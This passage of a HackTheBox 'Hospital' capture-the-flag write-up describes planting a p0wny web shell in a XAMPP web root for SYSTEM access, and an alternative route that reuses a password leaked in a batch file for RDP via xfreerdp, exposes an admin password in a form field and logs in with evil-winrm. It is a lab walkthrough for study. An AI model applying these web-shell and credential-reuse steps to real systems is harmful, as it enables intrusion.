ZwoMidBrrM9isT59fF9977rwE/a7jZ2DveNfrdq09d2wqvaWUk/gcSRdeIb7NaxcML2GFXhcTtiJI4zukpz0SjRjWor1UbUmjxxU10OoBs1+ZzR/aFh269GggarvhlW3rop1Ict0udIap1TgcYQQQgghhBBCCCGEEEK/E0xA/XNhAiqqDbjfpQu3Z01gAuqvkaiJCah8v8T+khZMQJUiTEDlq/N58tNgAiomoFbCBFRC7SWgUn4jOTUAAAGVSURBVNWhGScmoEoRJqDy2zEBtQpMQK2HMAGVXn1LQKWqQ1+fKUxArSuYgIoJqJiAKk2YgCrx9qmTBFSqOhLXJ4UJqFTLJW7CBFQCJqBWgQmo9RwmoDLaPnWVgEpTh75dfJiASrVcAiagEjABtQpMQKWHCaiYgMooAVWoTrXtNYEJqJiAKi2YgPqT6kgGE1ABE1DFWG5tJ6CK1qFvryFMQAVMQJUGTED9eXXoYQIqJqBKvFyo5QRUqjrV1pcYJqACJqDWGCagYgJqHcAE1F8rAZWqDlW7VGACKiag1hAmoGICat3ABFTJtk9dJaBS1al2fWsIE1CrXQVMQKWBCaio1mEC6p8ME1ABE1CRRDAf7teACah/JkxABUxARTWAZ7hfAyag/pkwARUwARUhhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYSQGP4PGw9Zsfl8EloAAAAASUVORK5CYII=" width="587" height="96" class="img_ev3q"></p>
<p>downloading the p0wny shell in the htdocs directory</p>
<p><img decoding="async" loading="lazy" alt="saving p0wny" src="/assets/images/saving_p0wny_htdocs-19c51bb9afa41442e3472b1c94fcd290.png" width="689" height="129" class="img_ev3q"></p>
<p>Navigate to <a href="https://hospital.htb/pwny.php" target="_blank" rel="noopener noreferrer">https://hospital.htb/pwny.php</a> and a shell as nt authority will be given</p>
<p><img decoding="async" loading="lazy" alt="whoami admin" src="data:image/png;base64,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" width="361" height="150" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution-2-rdp">Solution 2 RDP<a href="#solution-2-rdp" class="hash-link" aria-label="Direct link to Solution 2 RDP" title="Direct link to Solution 2 RDP" translate="no">​</a></h3>
<p>There is a password in the ghostscript.bat file. <strong>drbrown<!-- -->:chr<!-- -->!$br0wn</strong></p>
<p><img decoding="async" loading="lazy" alt="drbrown pass" src="/assets/images/drbrown_pass_1-5cd81ae09d394d8215f05e0859e58228.png" width="543" height="134" class="img_ev3q"></p>
<p>Connect to rdp as user drbrown</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">xfreerdp /v:10.10.11.241 /u:drbrown /p:&#x27;chr!$br0wn&#x27;</span><br></span></code></pre></div></div>
<p>Here the password can be retrieved in cleartext by just changing the input type from &quot;password&quot; to &quot;text&quot;. <strong>Administrator<!-- -->:Th3B3stH0sp1t4l9786<!-- -->!</strong></p>
<p><img decoding="async" loading="lazy" alt="admin pass" src="/assets/images/admin_pass_1-bb2c860f42649eb19c17bfbdef7833c5.png" width="768" height="576" class="img_ev3q"></p>
<p>The credentials successfully authenticate with evil-winrm, granting admin access to the victim machine.</p>
<p><img decoding="async" loading="lazy" alt="winrm as admin" src="/assets/images/winrm_as_admin-c02e6243976afe2d7673353516287547.png" width="585" height="226" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/xffsec/xffsec.github.io/tree/main/writeups/HackTheBox/hospital.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/forest"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Forest</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/reddish"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Reddish</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#enumeration" class="table-of-contents__link toc-highlight">Enumeration</a></li><li><a href="#file-upload-exploit" class="table-of-contents__link toc-highlight">File upload exploit</a></li><li><a href="#shell-on-linux-server" class="table-of-contents__link toc-highlight">Shell on Linux Server</a></li><li><a href="#privesc-on-linux-server" class="table-of-contents__link toc-highlight">Privesc on Linux Server</a></li><li><a href="#access-to-the-windows-server" class="table-of-contents__link toc-highlight">Access to the Windows server</a></li><li><a href="#root" class="table-of-contents__link toc-highlight">Root</a><ul><li><a href="#solution-1-xampp-misconfiguration" class="table-of-contents__link toc-highlight">solution 1 (XAMPP misconfiguration)</a></li><li><a href="#solution-2-rdp" class="table-of-contents__link toc-highlight">Solution 2 RDP</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Documentation</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" 